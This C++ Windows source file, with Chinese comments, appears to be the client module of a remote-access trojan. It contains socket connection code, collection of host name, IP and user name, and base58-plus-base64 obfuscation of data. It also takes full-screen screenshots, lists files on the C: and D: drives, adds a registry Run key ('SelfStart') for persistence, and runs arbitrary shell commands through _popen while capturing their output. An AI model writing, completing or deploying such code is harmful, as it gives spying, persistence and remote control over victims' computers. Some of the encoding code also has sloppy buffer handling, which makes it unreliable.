#include "tcpSocke.h"

bool init_Socket()
{
	WSADATA data;
	if (WSAStartup(MAKEWORD(2, 2), &data) != 0)//Windows socket async ：Windows异步套接字
	{
		err("WSAStartup");
		return false;
	}
	return true;
}

bool close_Socket()
{
	if (WSACleanup() != 0)
	{
		err("WSACleanup");
		return false;
	}
	return true;
}

SOCKET CreatServerScoket()
{
	//1、创建空的socket
	/*
	parm1：AF 地址协议族 IPv4， IPv6
	parm2：type 地址协议类型 流式套接字， 数据报
	parm3：protocol 使用具体的某个传输协议
	*/
	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == INVALID_SOCKET)
	{
		err("SOCKET");
	}
	//2、绑定ip地址和端口号
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;//和创建时要一样
	addr.sin_port = htons(PORT);	//把主机字节顺序转换为网络字节顺序
	addr.sin_addr.S_un.S_addr = ADDR_ANY;//inet_addr("127.0.0.1")

	if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
	{
		err("bind");
		return false;
	}
	//3、监听电话：
	listen(fd, 10);
	return fd;
}

SOCKET CreatClientScoket(const char* ip)
{
	//1、创建空的socket
	/*
	parm1：AF 地址协议族 IPv4， IPv6
	parm2：type 地址协议类型 流式套接字， 数据报
	parm3：protocol 使用具体的某个传输协议
	*/
	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == INVALID_SOCKET)
	{
		err("SOCKET");
	}
	//2、绑定ip地址和端口号
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;//和创建时要一样
	addr.sin_port = htons(PORT);	//把主机字节顺序转换为网络字节顺序
	addr.sin_addr.S_un.S_addr = inet_addr(ip);
	//3、与服务器建立连接
	if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == INVALID_SOCKET)
	{
		err("connect");
		return false;
	}
	return fd;
}

bool getmessage(struct PC_Message* messages)
{
	DWORD NameLen = BUFSIZ;
	if (gethostname(messages->PCName, sizeof(messages->PCName)) == SOCKET_ERROR)
	{
		err("PCName");
	}
	struct hostent* p = gethostbyname(messages->PCName);
	if (p == 0)
	{
		err("host and IP");
	}
	else
	{
		//获取本机计算机名
		for (int i = 0; p->h_addr_list[i] != 0; i++)//本机IP
		{
			struct in_addr in;
			memcpy(&in, p->h_addr_list[i], sizeof(struct in_addr));
			strcpy(messages->IP, inet_ntoa(in));
		}
	}
	if (!GetUserName(messages->UserName, &NameLen))
	{
		err("UserName");
	}
	return true;
}

bool TcharToChar(const TCHAR* tchar, char* _char)
{
	int iLength;
	//获取字节长度   
	iLength = WideCharToMultiByte(CP_ACP, 0, tchar, -1, NULL, 0, NULL, NULL);
	//将tchar值赋给_char    
	WideCharToMultiByte(CP_ACP, 0, tchar, -1, _char, iLength, NULL, NULL);
	return true;
}

bool HeartBeat(SOCKET fd)
{
	char buf[] = "keep alive";
	encode(buf);
	while (true)
	{
		//send(fd, buf, sizeof(buf), 0);
		cout << buf << endl;
		Sleep(5000);
	}
	return false;
}

void base58encode(char plainText[])
{
	int i;
	long long sum = 0;
	int len = strlen(plainText) * 138 / 100 + 1;// len * log(2)256 / log(2)(58) + 1
	char base58Table[59] = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
	char* encryption = (char*)malloc(len * sizeof(char));
	int index = 0;
	memset(encryption, 0, len * sizeof(char));
	while (index < strlen(plainText)) {
		int each = plainText[index];
		for (i = len - 1; ; i--) {
			each += encryption[i] * 256;
			encryption[i] = each % 58;
			each /= 58;
			if (0 == each)
				break;
		}
		i = 0;//输出
		index++;
	}
	i = 0;
	while (!encryption[i])
		i++;
	for (; i <= len - 1; i++)
	{
		plainText[i] = base58Table[encryption[i]];
	}
}

void base64encode(char* str)
{
	long len;
	long str_len;
	char* res;
	int i, j;
	//定义base64编码表  
	char* base64_table = (char*)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

	//计算经过base64编码后的字符串长度  
	str_len = strlen(str);
	if (str_len % 3 == 0)
		len = str_len / 3 * 4;
	else
		len = (str_len / 3 + 1) * 4;

	res = (char*)malloc(sizeof(unsigned char) * len + 1);
	res[len] = '\0';

	//以3个8位字符为一组进行编码  
	for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
	{
		res[i] = base64_table[str[j] >> 2]; //取出第一个字符的前6位并找出对应的结果字符  
		res[i + 1] = base64_table[(str[j] & 0x3) << 4 | (str[j + 1] >> 4)]; //将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符  
		res[i + 2] = base64_table[(str[j + 1] & 0xf) << 2 | (str[j + 2] >> 6)]; //将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符  
		res[i + 3] = base64_table[str[j + 2] & 0x3f]; //取出第三个字符的后6位并找出结果字符  
	}

	switch (str_len % 3)
	{
	case 1:
		res[i - 2] = '=';
		res[i - 1] = '=';
		break;
	case 2:
		res[i - 1] = '=';
		break;
	}
	strcpy(str, res);
}

void encode(char* text)
{
	base58encode(text);
	base64encode(text);
}

void ScreenShot(LPCTSTR s)
{
	HDC hdcSrc = GetDC(NULL);
	int nBitPerPixel = GetDeviceCaps(hdcSrc, BITSPIXEL);//像素
	int nWidth = GetDeviceCaps(hdcSrc, HORZRES);//宽
	int nHeight = GetDeviceCaps(hdcSrc, VERTRES);//高
	CImage image;
	image.Create(nWidth, nHeight, nBitPerPixel);
	BitBlt(image.GetDC(), 0, 0, nWidth, nHeight, hdcSrc, 0, 0, SRCCOPY);//用于从原设备中复制位图到目标设备
															//SRCCOPY 直接复制源设备区域到目标设备中
	ReleaseDC(NULL, hdcSrc);
	image.ReleaseDC();
	image.Save(s, Gdiplus::ImageFormatPNG);//ImageFormatJPEG
}

void readSrc()
{
	// 1. 打开图片文件
	ifstream Src("C:\\Windows\\Screenshots.bmp", ifstream::in | ios::binary);
	// 2. 计算图片长度
	Src.seekg(0, Src.end);  //将文件流指针定位到流的末尾
	int length = Src.tellg();
	Src.seekg(0, Src.beg);  //将文件流指针重新定位到流的开始
	// 3. 创建内存缓存区
	char* buffer = new char[length];
	// 4. 读取图片
	Src.read(buffer, length);
	// 到此，图片已经成功的被读取到内存（buffer）中
	printf("%s\n", buffer);
	delete[] buffer;
}

void GetFileName(char FileName[FileNameRow][FileNameCol])
{
	int i;
	for (i = 0; i < FileNameRow; i++)//对存储文件名的二维数组初始化
	{
		memset(FileName[i], 0, sizeof(FileName[i]));
	}
	intptr_t Handle;
	struct _finddata_t FileInfo;
	string p;
	string path1 = "C:";
	string path2 = "D:";
	Handle = _findfirst(p.assign(path1).append("\\*").c_str(), &FileInfo);
	strcpy(FileName[0], "C drive");//提示
	i = 1;
	while (_findnext(Handle, &FileInfo) == 0)
	{
		strcpy(FileName[i], FileInfo.name);
		i++;
	}
	strcpy(FileName[i++], "D drive");//提示
	Handle = _findfirst(p.assign(path2).append("\\*").c_str(), &FileInfo);
	while (_findnext(Handle, &FileInfo) == 0)
	{
		strcpy(FileName[i], FileInfo.name);
		i++;
	}
	_findclose(Handle);
	//加密
	char Zero[FileNameCol] = { 0 };
	for (int i = 0; i < FileNameRow; i++)
	{
		if (strcmp(FileName[i], Zero))
		{
			encode(FileName[i]);
		}
	}
}

void ProcessProtect()
{

}

void ComputerStart(char* pathName)
{
	GetCurrentDirectory(MAX_PATH, (LPWSTR)pathName);//设置字符集为多字节字符集  获取当前文件路径

	sprintf(pathName, "%s\\", pathName);
	strcat(pathName, "client.exe");//找到需要开机自启动的程序
	//找到系统的启动项 
	char* szSubKey = (char*)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey;

	//打开注册表启动项 
	int k = RegOpenKeyExA(HKEY_CURRENT_USER, szSubKey, 0, KEY_ALL_ACCESS, &hKey);
	if (k == ERROR_SUCCESS)
	{
		//添加一个子Key,并设置值，MyStart为启动项名称，自定义设置；
		RegSetValueEx(hKey, (LPCWSTR)(CString)"SelfStart", 0, REG_SZ, (BYTE*)pathName, strlen(pathName));
		//关闭注册表
		RegCloseKey(hKey);
		printf("successs\n");
	}
	else
	{
		printf("error:%d\n", k);
	}
}

int Execmd(char* shell, char* result)
{
	char buffer[BUFSIZ * 4 ];                         //定义缓冲区                        
	FILE* pipe = _popen(shell, "r");            //打开管道，并执行命令 
	if (!pipe)
	{
		return 0;                      //返回0表示运行失败 
	}

	while (!feof(pipe))
	{
		if (fgets(buffer, BUFSIZ * 4, pipe))
		{           //将管道输出到result中 
			strcat(result, buffer);
		}
	}
	_pclose(pipe);                            //关闭管道 
	return 1;                                 //返回1表示运行成功 
}